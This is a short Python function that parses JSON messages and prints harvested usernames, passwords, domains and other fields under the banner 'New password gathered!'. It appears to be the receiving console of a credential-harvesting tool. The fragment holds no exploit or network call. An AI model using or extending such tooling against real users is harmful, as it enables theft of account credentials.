import json

def parseData(data):
    data = json.loads(data)
    if data["type"] == "data":
        print("----------------------")
        if "credentials" in data["data"]:
            print("[!] New password gathered!\n" + data["data"]["credentials"]["Username"] + ":" + data["data"]["credentials"]["Password"])
            if "Domain" in data["data"]["credentials"]:
                print("Domain: " + data["data"]["credentials"]["Domain"])
        if "otherData" in data["data"]:
            for key in data["data"]["otherData"]:
                print(str(key) + " = " + str(data["data"]["otherData"][key]))
        print("----------------------")